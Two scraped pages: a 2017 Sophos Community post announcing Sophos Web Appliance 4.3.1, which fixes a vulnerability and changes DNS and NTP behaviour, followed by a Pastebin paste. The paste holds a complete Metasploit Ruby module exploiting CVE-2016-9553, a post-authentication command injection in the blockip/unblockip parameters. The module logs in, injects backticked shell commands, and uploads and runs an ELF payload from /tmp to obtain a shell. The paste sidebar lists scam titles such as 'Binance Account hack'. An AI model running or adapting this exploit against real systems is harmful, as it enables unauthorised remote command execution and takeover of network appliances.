=== Content from community.sophos.com_9d1262cd_20250125_201146.html ===


[![Sophos Community](https://community.sophos.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/widgetcontainerfiles-3fc3f82483d14ec485ef92e206116d49-s-AAAAAAAAAAAAAAAAAAAAAA-header-header-Z_2D00_IDKephE0KP_2D00_tiVeHl0_5F00_w-logo/Sophos-Community-Logo-April-2021-White-_2D00_-250x52.png_2D00_125x44.png?_=638693588173209557)](https://community.sophos.com/ "Home")

Sophos Community

* [User](/login?ReturnUrl=%2Fweb-appliance%2Fb%2Fblog%2Fposts%2Frelease-of-swa-version-4-3-1 "Join or sign in")

* Site
* Search
* [User](/login?ReturnUrl=%2Fweb-appliance%2Fb%2Fblog%2Fposts%2Frelease-of-swa-version-4-3-1)
* Toggle Mobile menu

* Community & Product Forums
* Blogs
* Partners
* Events & Webinars
* Getting Started
* [Support Portal](https://support.sophos.com/support/s/)

* Community Blogs
  + [Application Control](/sophos-labs/b/application-control)
  + [Community](/b/community-blog)
  + [Product documentation](/product-documentation/b/blog)
  + [Security](/b/security-blog)
* Feedback
  + [Support Portal](/support-portal/)
  + [Product documentation](/product-documentation/)

* Products
  + Endpoint security
    - [Sophos Endpoint](/intercept-x-endpoint/)
    - [Sophos XDR](/sophos-xdr/)
    - [Sophos Mobile](/sophos-mobile/)
  + Network Security
    - [Sophos Firewall](/sophos-xg-firewall/)
    - [ZTNA](/zero-trust-network-access/)
    - [Sophos Switch](/sophos-switch/)
    - [UTM Firewall](/utm-firewall/)
    - [Sophos Wireless](/sophoswireless/)
    - [NDR](/ndr-community-channel/)
  + Email Security
    - [Sophos
      Email](/sophos-email/)
    - [Phish
      Threat](/phish-threat/)
  + Cloud Security
    - [Sophos Central](/sophos-central/)
    - [Sophos Cloud Optix](/sophos-cloud-optix/)
  + Support Tools
    - [Sophos integrations](/sophos-integrations/)
    - [Free tools](/free-tools/)
* Services
  + Management platform
    - [Sophos Central](https://central.sophos.com/manage/login)
    - [Support Portal](https://support.sophos.com)
    - [Sophos Community log in](/login?ReturnUrl=%2F)

* Sophos Partners
  + [Partners blog](/sophos-partners/)
  + [Local Partner community](/sophos-partners/subgrouplist)
  + [Partner news](https://partnernews.sophos.com/en-us/)
* Resources
  + [MSP guides](/sophos-partners/b)
  + [Partner Care](https://www.sophos.com/en-us/partners/partner-care)
  + [Sophos Central](https://central.sophos.com/manage/login)
* Webinars & Events
  + [Webinars & Events](/sophos-partners/b/webinars-and-events)
  + [Calendar](/sophos-partners/c/14#pifragment-3086=1)
* Become a partner
  + [Join our
    program](/login?ReturnUrl=%2F)

* Events & Webinars
  + [Events & Webinars](/b/events-and-webinars)
  + [Calendar](/c/19#pifragment-3262=1)

* Getting started in the Community
  + [How to get started](/w/getting-started)
  + [SophosID registration](/w/getting-started/90/sophosid-registration)
  + [How to set up your profile](/w/getting-started/88/sophos-community-how-to-set-up-your-profile)
  + [How to contribute and participate](/w/getting-started/86/sophos-community-how-to-contribute-and-participate)
  + [How to manage private messages](/w/getting-started/89/sophos-community-how-to-manage-private-messages)
* Member recognition
  + [Rewards program](/w/member-recognition)
  + [Leaderboard](/leaders)

* Products and Services
  + Products
    - Endpoint security
      * [Sophos Endpoint](/intercept-x-endpoint/)
      * [Sophos XDR](/sophos-xdr/)
      * [Sophos Mobile](/sophos-mobile/)
    - Network Security
      * [Sophos Firewall](/sophos-xg-firewall/)
      * [ZTNA](/zero-trust-network-access/)
      * [Sophos Switch](/sophos-switch/)
      * [UTM Firewall](/utm-firewall/)
      * [Sophos Wireless](/sophoswireless/)
      * [NDR](/ndr-community-channel/)
    - Email Security
      * [Sophos
        Email](/sophos-email/)
      * [Phish
        Threat](/phish-threat/)
    - Cloud Security
      * [Sophos Central](/sophos-central/)
      * [Sophos Cloud Optix](/sophos-cloud-optix/)
    - Support Tools
      * [Sophos integrations](/sophos-integrations/)
      * [Free tools](/free-tools/)
  + Services
    - Management platform
      * [Sophos Central](https://central.sophos.com/manage/login)
      * [Support Portal](https://support.sophos.com)
      * [Sophos Community log in](/login?ReturnUrl=%2F)
* Blogs
  + Community Blogs
    - [Application Control](/sophos-labs/b/application-control)
    - [Community](/b/community-blog)
    - [Product documentation](/product-documentation/b/blog)
    - [Security](/b/security-blog)
  + Feedback
    - [Support Portal](/support-portal/)
    - [Product documentation](/product-documentation/)
* Partners
  + Sophos Partners
    - [Partners blog](/sophos-partners/)
    - [Local Partner community](/sophos-partners/subgrouplist)
    - [Partner news](https://partnernews.sophos.com/en-us/)
  + Resources
    - [MSP guides](/sophos-partners/b)
    - [Partner Care](https://www.sophos.com/en-us/partners/partner-care)
    - [Sophos Central](https://central.sophos.com/manage/login)
  + Webinars & Events
    - [Webinars & Events](/sophos-partners/b/webinars-and-events)
    - [Calendar](/sophos-partners/c/14#pifragment-3086=1)
  + Become a partner
    - [Join our
      program](/login?ReturnUrl=%2F)
* Events & Webinars
  + Events & Webinars
    - [Events & Webinars](/b/events-and-webinars)
    - [Calendar](/c/19#pifragment-3262=1)
* Getting Started
  + Getting started in the Community
    - [How to get started](/w/getting-started)
    - [SophosID registration](/w/getting-started/90/sophosid-registration)
    - [How to set up your profile](/w/getting-started/88/sophos-community-how-to-set-up-your-profile)
    - [How to contribute and participate](/w/getting-started/86/sophos-community-how-to-contribute-and-participate)
    - [How to manage private messages](/w/getting-started/89/sophos-community-how-to-manage-private-messages)
  + Member recognition
    - [Rewards program](/w/member-recognition)
    - [Leaderboard](/leaders)
* [Support Portal](https://support.sophos.com/support/s/)

* [Community Blog](/b)
* [Member Recognition](/w/member-recognition)
* More
* Cancel

[![Web Appliance (Read Only)](https://community.sophos.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/communityserver-components-groupavatars-00-00-00-00-12/web_2D00_appliance_2D00_136x136.png.png_2D00_68x68x2.png?_=636109507114810689)](https://community.sophos.com/web-appliance/)

[Web Appliance (Read Only)](https://community.sophos.com/web-appliance/)

[Release Notes & News](https://community.sophos.com/web-appliance/b/blog)

[Release of SWA version 4.3.1](https://community.sophos.com/web-appliance/b/blog/posts/release-of-swa-version-4-3-1)

* [Release Notes & News](/web-appliance/b/blog)
* [Recommended Reads](/web-appliance/f/recommended-reads)
* [Discussions](/web-appliance/f/discussions)
* [Members](/web-appliance/members)
* More
* Cancel

* [New](/login?ReturnUrl=%2Fweb-appliance%2Fb%2Fblog%2Fposts%2Frelease-of-swa-version-4-3-1)

[Web Appliance (Read Only) requires membership for participation - click to join](/login?ReturnUrl=%2Fweb-appliance%2F%3Frequestmembership%3Dtrue)

# [Release of SWA version 4.3.1](https://community.sophos.com/web-appliance/b/blog/posts/release-of-swa-version-4-3-1)

* Subscribe by email
* More
* Cancel

* Share
* Subscribe by email
* More
* Cancel

Related

Recommended

[![RichBaldry](https://community.sophos.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/communityserver-components-avatars-00-00-01-20-90/4TXIIIDJJF6D.jpg_2D00_80x80x2.jpg?_=635920072920046267)](/members/richbaldry)

[RichBaldry](/members/richbaldry)

19 Jan 2017

In the past day, we have begun the release of version 4.3.1 of the Sophos Web Appliance. Rollout will continue to customers over the next couple of weeks.

This new version fixes a vulnerability, discovered by Russell Sanford of Critical Start, along with a number of defects that were either discovered in-house or experienced by customers. You can find out more about these fixes in the [Release Notes](http://swa.sophos.com/rn/swa/concepts/ReleaseNotes_4.3.1.html).

A couple of the fixes required behaviour changes that may impact customers on upgrade. If your SWA is configured with multiple DNS servers, and those servers cannot resolve all the same domain information, or if you restrict access from your SWA to NTP services via rules on your network firewalls, you may be affected - so read on.

The DNS change relates to the use of secondary or tertiary DNS servers. Prior to version 4.3.1 the SWA would only switch from using the primary to the secondary after a failure, which for some customers meant that they would experience browsing failures for short periods while the system was waiting for the responses to fail and then switch over.

In version 4.3.1 we are taking a more dynamic approach to us of multiple DNS servers. By optimizing requests between servers, we can be more robust when one server fails. But it does make it more likely that the secondary or tertiary server will come into play from time to time.

If your secondary or tertiary servers cannot resolve some domain names (for example, if your primary is an internal server with Active Directory information, and you use an ISP or other public DNS server for the secondary) you may find that users trying to browse to those non-public domains will occasionally fail. We expect most of you will not be in this situation, but your users do report intermittent failures browsing to local sites, do check your DNS server settings, and check that all your DNS servers are configured correctly.

If you do not have multiple servers hosting your internal DNS information, we recommend you do not configure a public DNS server as a secondary or tertiary.

For more information, see this [knowledgebase article](/kb/en-us/125869).

On the NTP side, we have changed the default NTP server used by the SWA to better reflect the terms of service of the NTP Pool Project. The default is now 0.sophos.pool.ntp.org, which resolves to a different IP address. For most customers, this will not have any impact, but if you are still using the default, and if your firewall has been configured to only allow outbound NTP connections to specific addresses, then the firewall may need to be updated so that your SWA can keep its clock in sync.

To find out more about the NTP Pool Project, [visit their website](http://www.pool.ntp.org/).

Unfiltered HTML

* [Getting started](https://community.sophos.com/w/getting-started)
* [Legal](https://www.sophos.com/en-us/legal.aspx)
* [Privacy](https://www.sophos.com/en-us/legal/sophos-group-privacy-notice.aspx)
* [Cookies](https://www.sophos.com/en-us/legal/cookie-information.aspx)

© 1997 -  Sophos Ltd. All rights reserved.



=== Content from pastebin.com_b1dd295b_20250125_201145.html ===


[Pastebin](/)
[API](/doc_api)
[tools](/tools)
[faq](/faq)

[paste](/)

[Login](/login)
[Sign up](/signup)

Advertisement

SHARE
TWEET

![Guest User](/themes/pastebin/img/guest.png)
# Untitled

a guest
Feb 22nd, 2017

5,544
0
Never
[Add comment](/login?return_url=%2FDUYuN0U5%23add_comment)

**Not a member of Pastebin yet?**
[**Sign Up**](/signup),
it unlocks many cool features!

[Ruby](/archive/ruby) 6.03 KB
| None
|
[0](/login?return_url=%2FDUYuN0U5 "Like") [0](/login?return_url=%2FDUYuN0U5 "Dislike")
[raw](/raw/DUYuN0U5)
[download](/dl/DUYuN0U5)
[clone](/clone/DUYuN0U5)
[embed](/embed/DUYuN0U5)
[print](/print/DUYuN0U5)
[report](/report/DUYuN0U5)

1. # Exploit Title: Sophos Web Appliance UnBlock/Block-IP Remote Command Injection Vulnerability
2. # Date: 12/12/2016
3. # Exploit Author: xort @ Critical Start
4. # Vendor Homepage: www.sophos.com
5. # Software Link: sophos.com/en-us/products/secure-web-gateway.aspx
6. # Version: 4.2.1.3
7. # Tested on: 4.2.1.3
8. #
9. # CVE : CVE-2016-9553
11. # vuln 1: unblockip parameter / MgrReport.php exploit
12. # vuln 2: blockip parameter   / MgrReport.php exploit
14. # Description PostAuth Sophos Web App FW <= v4.2.1.3 for capabilities. This exploit leverages a command injection bug.
15. #
16. # xort @ Critical Start
18. require 'msf/core'
20. class MetasploitModule < Msf::Exploit::Remote
21. Rank = ExcellentRanking
22. include  Exploit::Remote::Tcp
23. include Msf::Exploit::Remote::HttpClient
25. def initialize(info = {})
26. super(update\_info(info,
27. 'Name'           => 'Sophos Web Appliance <= v4.2.1.3 block/unblock remote exploit',
28. 'Description'    => %q{
29. This module exploits two 2 separate remote command injection vulnerabilities in
30. the Sophos Web Appliance Version <=  v4.2.1.3 the web administration interface.
31. By sending a specially crafted request it's possible to inject system
32. commands
33. },
34. 'Author'         =>
35. [
36. 'xort', # vuln + metasploit module
37. ],
38. 'Version'        => '$Revision: 2 $',
39. 'References'     =>
40. [
41. [ 'none', 'none'],
42. ],
43. 'Platform'      => [ 'linux'],
44. 'Privileged'     => true,
45. 'Arch'          => [ ARCH\_X86 ],
46. 'SessionTypes'  => [ 'shell' ],
47. 'Privileged'     => false,
49. 'Payload'        =>
50. {
51. 'Compat' =>
52. {
53. 'ConnectionType' => 'find',
54. }
55. },
57. 'Targets'        =>
58. [
59. [
60. 'blockip method',
61. {
62. 'Arch' => ARCH\_X86,
63. 'Platform' => 'linux',
64. 'VulnName' => 'blockip',
65. 'VulnNum' => '1',
66. },
67. ],
68. [
69. 'unblockip method',
70. {
71. 'Arch' => ARCH\_X86,
72. 'Platform' => 'linux',
73. 'VulnName' => 'unblockip',
74. 'VulnNum' => '2',
75. },
76. ],
77. ],
78. 'DefaultTarget' => 0))
80. register\_options(
81. [
82. OptString.new('PASSWORD', [ false, 'Device password', "" ]),
83. OptString.new('USERNAME', [ true, 'Device password', "admin" ]),
84. OptString.new('CMD', [ false, 'Command to execute', "" ]),
85. Opt::RPORT(443),
86. ], self.class)
87. end
90. def do\_login(username, password\_clear)
91. vprint\_status( "Logging into machine with credentials...\n" )
93. # vars
94. timeout = 11550;
95. style\_key = Rex::Text.rand\_text\_hex(32)
97. # send request
98. res = send\_request\_cgi(
99. {
100. 'method'  => 'POST',
101. 'uri'     => "/index.php",
102. 'vars\_get' => {
103. 'c' => 'login',
104. },
105. 'vars\_post' =>
106. {
108. 'STYLE' => style\_key,
109. 'destination' => '',
110. 'username' => username,
111. 'password' => password\_clear,
112. }
113. }, timeout)
115. return style\_key
116. end
118. def run\_command(username, style\_password, cmd)
119. vprint\_status( "Running Command...\n" )
121. # random attack method from calling methods into
122. calling\_commands = [ 'report','trend\_volume','trend\_suspect','top\_app\_ctrl','perf\_latency','perf\_throughput','users\_browse\_summary','traf\_sites','traf\_blocked','traf\_users','users\_virus\_downloaders','users\_pua\_downloaders','users\_highrisk','users\_policy\_violators','users\_top\_users\_by\_browse\_time','users\_quota','users\_browse\_time\_by\_user','users\_top\_users\_by\_category','users\_site\_visits\_by\_user','users\_category\_visits\_by\_user','users\_monitored\_search\_queries','users\_app\_ctrl','traf\_category','traf\_download' ,'warned\_sites' ]
124. # select random calling page that calls the vulnerable page MgrReport.php where the vulns are
125. attack\_method = calling\_commands[rand(calling\_commands.length)]
127. # random filename to dump too + 'tmp' HAS to be here.
128. b64dumpfile = "/tmp/" + rand\_text\_alphanumeric(4+rand(4))
130. vprint\_status( "Attacking Vuln #" + target['VulnNum']+ " - " + target['VulnName'] + " with " + attack\_method  + "command method" )
131. res = send\_request\_cgi({
132. 'method' => 'GET',
133. 'uri' => '/index.php?c=trend\_suspect&' + target['VulnName'] + '=1.2.3.6`'+ cmd +'`&STYLE='+style\_password
134. })
136. end
138. def exploit
139. # timeout
140. timeout = 1550;
142. # params
143. password\_clear = datastore['PASSWORD']
144. user = datastore['USERNAME']
146. style\_hash = do\_login(user, password\_clear)
148. vprint\_status("STATUS hash authenticated: #{style\_hash}\n")
150. sleep(5)
152. #if no 'CMD' string - add code for root shell
153. if not datastore['CMD'].nil? and not datastore['CMD'].empty?
155. cmd = datastore['CMD']
157. # Encode cmd payload
158. encoded\_cmd = cmd.unpack("H\*").join().gsub(/(\w)(\w)/,'\\x\1\2')
160. # kill stale calls to bdump from previous exploit calls for re-use
161. run\_command(user, style\_hash, ("sudo /bin/rm -f /tmp/n ;printf \"#{encoded\_cmd}\" > /tmp/n; chmod +rx /tmp/n ; /tmp/n" ))
162. else
163. # Encode payload to ELF file for deployment
164. elf = Msf::Util::EXE.to\_linux\_x86\_elf(framework, payload.raw)
165. encoded\_elf = elf.unpack("H\*").join().gsub(/(\w)(\w)/,'\\\\\\x\1\2')
167. # upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
168. run\_command(user, style\_hash, ("echo%20-e%20#{encoded\_elf}\>%20/tmp/m\;chmod%20%2brx%20/tmp/m\;/tmp/m"))
169. # wait for magic
170. handler
172. end
175. end
176. end

Advertisement

Add Comment
Please, [**Sign In**](/login?return_url=%2FDUYuN0U5%23add_comment) to add comment

Advertisement

[Public Pastes](/archive)

* [⭐ FREE giftcards method⭐ 8Y](/s6v5yMhE)
  JavaScript |
  2 sec ago
  | 0.18 KB
* [⭐ get any gift card for FREE](/7cd20h8L)
  JavaScript |
  6 sec ago
  | 0.05 KB
* [⭐ FREE giftcards method](/HvKZKa5A)
  JavaScript |
  6 sec ago
  | 0.05 KB
* [⭐ Binance Account hack 2F](/uvWyhsyp)
  JavaScript |
  7 sec ago
  | 0.18 KB
* [⭐ get any gift card for FREE⭐ 2T](/zQZeGd6f)
  JavaScript |
  8 sec ago
  | 0.18 KB
* [⭐ FREE giftcards method CI](/APumJ1F5)
  JavaScript |
  8 sec ago
  | 0.18 KB
* [⭐ Binance Account hack B0](/bS4KW90g)
  JavaScript |
  9 sec ago
  | 0.18 KB
* [⭐ get any gift card for FREE](/M5wHNfzK)
  JavaScript |
  11 sec ago
  | 0.05 KB

Advertisement

[create new paste](/)  /
[syntax languages](/languages)  /
[archive](/archive)  /
[faq](/faq)  /
[tools](/tools)  /
[night mode](/night_mode)  /
[api](/doc_api)  /
[scraping api](/doc_scraping_api)  /
[news](/news)  /
[pro](/pro)

[privacy statement](/doc_privacy_statement)  /
[cookies policy](/doc_cookies_policy)  /
[terms of service](/doc_terms_of_service) /
[security disclosure](/doc_security_disclosure)  /
[dmca](/dmca)  /
[report abuse](/report-abuse)  /
[contact](/contact)

By using Pastebin.com you agree to our [cookies policy](/doc_cookies_policy) to enhance your experience.

Site design & logo © 2025 Pastebin

We use cookies for various purposes including analytics. By continuing to use Pastebin, you agree to our use of cookies as described in the [Cookies Policy](/doc_cookies_policy).  OK, I Understand

[![](/themes/pastebin/img/hello.webp)](/signup)

Not a member of Pastebin yet?


